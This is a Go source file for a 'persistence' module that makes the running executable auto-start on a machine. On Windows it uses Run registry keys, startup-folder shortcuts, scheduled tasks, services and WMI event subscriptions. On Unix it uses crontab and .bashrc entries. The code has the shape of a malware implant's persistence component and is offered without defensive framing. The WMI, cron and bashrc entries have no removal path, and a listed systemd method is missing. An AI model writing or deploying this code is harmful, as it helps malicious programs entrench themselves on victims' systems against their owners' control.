package persistence

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
)

type PersistenceHandler struct {
	execPath string
}

func NewPersistenceHandler() (*PersistenceHandler, error) {
	execPath, err := os.Executable()
	if err != nil {
		return nil, err
	}
	return &PersistenceHandler{
		execPath: execPath,
	}, nil
}

func (p *PersistenceHandler) InstallRegistry(name string) error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("registry persistence only works on Windows")
	}

	cmd := exec.Command("reg", "add",
		"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
		"/v", name,
		"/t", "REG_SZ",
		"/d", p.execPath,
		"/f")

	return cmd.Run()
}

func (p *PersistenceHandler) RemoveRegistry(name string) error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("registry persistence only works on Windows")
	}

	cmd := exec.Command("reg", "delete",
		"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
		"/v", name,
		"/f")

	return cmd.Run()
}

func (p *PersistenceHandler) InstallStartupFolder(name string) error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("startup folder persistence only works on Windows")
	}

	startupPath := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
	linkPath := filepath.Join(startupPath, name+".lnk")

	cmd := exec.Command("powershell", "-Command",
		fmt.Sprintf("$WshShell = New-Object -comObject WScript.Shell; $Shortcut = $WshShell.CreateShortcut('%s'); $Shortcut.TargetPath = '%s'; $Shortcut.Save()",
			linkPath, p.execPath))

	return cmd.Run()
}

func (p *PersistenceHandler) RemoveStartupFolder(name string) error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("startup folder persistence only works on Windows")
	}

	startupPath := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
	linkPath := filepath.Join(startupPath, name+".lnk")

	return os.Remove(linkPath)
}

func (p *PersistenceHandler) InstallScheduledTask(name string, interval int) error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("scheduled task persistence only works on Windows")
	}

	cmd := exec.Command("schtasks", "/create",
		"/tn", name,
		"/tr", p.execPath,
		"/sc", "minute",
		"/mo", fmt.Sprintf("%d", interval),
		"/f")

	return cmd.Run()
}

func (p *PersistenceHandler) RemoveScheduledTask(name string) error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("scheduled task persistence only works on Windows")
	}

	cmd := exec.Command("schtasks", "/delete", "/tn", name, "/f")
	return cmd.Run()
}

func (p *PersistenceHandler) InstallService(name, displayName string) error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("service persistence only works on Windows")
	}

	cmd := exec.Command("sc", "create", name,
		"binPath=", p.execPath,
		"DisplayName=", displayName,
		"start=", "auto")

	if err := cmd.Run(); err != nil {
		return err
	}

	startCmd := exec.Command("sc", "start", name)
	return startCmd.Run()
}

func (p *PersistenceHandler) RemoveService(name string) error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("service persistence only works on Windows")
	}

	stopCmd := exec.Command("sc", "stop", name)
	stopCmd.Run()

	deleteCmd := exec.Command("sc", "delete", name)
	return deleteCmd.Run()
}

func (p *PersistenceHandler) InstallWMI(name string) error {
	if runtime.GOOS != "windows" {
		return fmt.Errorf("WMI persistence only works on Windows")
	}

	script := fmt.Sprintf(`
		$filterName = '%s_Filter'
		$consumerName = '%s_Consumer'
		$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
			Name = $filterName
			EventNamespace = 'root\cimv2'
			QueryLanguage = 'WQL'
			Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
		}
		$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
			Name = $consumerName
			CommandLineTemplate = '%s'
		}
		Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
			Filter = $filter
			Consumer = $consumer
		}
	`, name, name, p.execPath)

	cmd := exec.Command("powershell", "-Command", script)
	return cmd.Run()
}

func (p *PersistenceHandler) InstallCronJob(schedule string) error {
	if runtime.GOOS == "windows" {
		return fmt.Errorf("cron jobs only work on Unix systems")
	}

	cronEntry := fmt.Sprintf("%s %s\n", schedule, p.execPath)
	cmd := exec.Command("sh", "-c", fmt.Sprintf("(crontab -l 2>/dev/null; echo '%s') | crontab -", cronEntry))
	return cmd.Run()
}

func (p *PersistenceHandler) InstallBashProfile() error {
	if runtime.GOOS == "windows" {
		return fmt.Errorf("bash profile only works on Unix systems")
	}

	homeDir, err := os.UserHomeDir()
	if err != nil {
		return err
	}

	bashrcPath := filepath.Join(homeDir, ".bashrc")
	entry := fmt.Sprintf("\n%s &\n", p.execPath)

	f, err := os.OpenFile(bashrcPath, os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		return err
	}
	defer f.Close()

	_, err = f.WriteString(entry)
	return err
}

func (p *PersistenceHandler) CheckPersistence(method string) (bool, error) {
	switch method {
	case "registry":
		if runtime.GOOS != "windows" {
			return false, fmt.Errorf("registry only on Windows")
		}
		cmd := exec.Command("reg", "query", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run")
		output, err := cmd.Output()
		if err != nil {
			return false, err
		}
		return len(output) > 0, nil
	case "startup":
		startupPath := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
		entries, err := os.ReadDir(startupPath)
		return len(entries) > 0, err
	default:
		return false, fmt.Errorf("unknown persistence method")
	}
}

func ListPersistenceMethods() []string {
	if runtime.GOOS == "windows" {
		return []string{"registry", "startup", "scheduled_task", "service", "wmi"}
	}
	return []string{"cron", "bashrc", "systemd"}
}
